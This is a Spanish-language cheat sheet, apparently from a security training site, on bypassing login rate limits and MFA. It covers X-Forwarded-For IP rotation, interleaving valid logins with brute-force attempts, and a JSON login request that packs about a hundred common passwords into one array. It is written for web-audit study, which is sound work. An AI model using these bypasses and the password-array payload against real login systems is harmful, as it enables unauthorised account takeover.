---
title: Evasión de protecciones
description: Resumen rápido de comandos esenciales para evadir las protecciones en la autenticación.
layout: academia_lesson
parent: /academia/ciberseguridad/cheatsheets/auditorias-web/documentacion/vulnerabilidades-de-autenticacion/
author: ElStitchMalo
date: 16/12/2025
updated:
tags: [autenticacion]
---

## Evasión de protecciones Rate Limit

### X-Forwarded-For

Añadir la cabecera `X-Forwarded-For` e iterar la IP en cada petición para evitar bloqueos por IP.

Por ejemplo:

~~~
X-Forwarded-For: 127.0.0.1
~~~

### Cuenta de usuario válida

Si se dispone de una cuenta válida, intercalar un inicio de sesión correcto antes de que se active el bloqueo temporal, alternándolo con intentos de fuerza bruta.

Configurar el `resource pool` a `1` para enviar una única petición simultánea.

### Múltiples credenciales por solicitud

#### JSON

Enviar múltiples contraseñas en un array dentro del parámetro `password`.

Request original:

~~~
{"username":"carlos","password":"1234"}
~~~

Request modificado:

~~~
{
    "username":"carlos",
    "password": [
        "123456",
        "password",
        "12345678",
        "qwerty",
        "123456789",
        "12345",
        "1234",
        "111111",
        "1234567",
        "dragon",
        "123123",
        "baseball",
        "abc123",
        "football",
        "monkey",
        "letmein",
        "shadow",
        "master",
        "666666",
        "qwertyuiop",
        "123321",
        "mustang",
        "1234567890",
        "michael",
        "654321",
        "superman",
        "1qaz2wsx",
        "7777777",
        "121212",
        "000000",
        "qazwsx",
        "123qwe",
        "killer",
        "trustno1",
        "jordan",
        "jennifer",
        "zxcvbnm",
        "asdfgh",
        "hunter",
        "buster",
        "soccer",
        "harley",
        "batman",
        "andrew",
        "tigger",
        "sunshine",
        "iloveyou",
        "2000",
        "charlie",
        "robert",
        "thomas",
        "hockey",
        "ranger",
        "daniel",
        "starwars",
        "klaster",
        "112233",
        "george",
        "computer",
        "michelle",
        "jessica",
        "pepper",
        "1111",
        "zxcvbn",
        "555555",
        "11111111",
        "131313",
        "freedom",
        "777777",
        "pass",
        "maggie",
        "159753",
        "aaaaaa",
        "ginger",
        "princess",
        "joshua",
        "cheese",
        "amanda",
        "summer",
        "love",
        "ashley",
        "nicole",
        "chelsea",
        "biteme",
        "matthew",
        "access",
        "yankees",
        "987654321",
        "dallas",
        "austin",
        "thunder",
        "taylor",
        "matrix",
        "mobilemail",
        "mom",
        "monitor",
        "monitoring",
        "montana",
        "moon",
        "moscow"
    ]
}
~~~

## Evasión de protecciones MFA

### Macros

Como hacer macros para evadir el rate limit de intentos al momento de verificar el MFA:

- [video](https://www.youtube.com/watch?time_continue=493&v=ZvU1M-OuXl0&embeds_referring_euri=https%3A%2F%2Fportswigger.net%2F&embeds_referring_origin=https%3A%2F%2Fportswigger.net&source_ve_path=MTM5MTE3LDI4NjYyLDI4NjYyLDEzOTExNywyODY2Ng) 
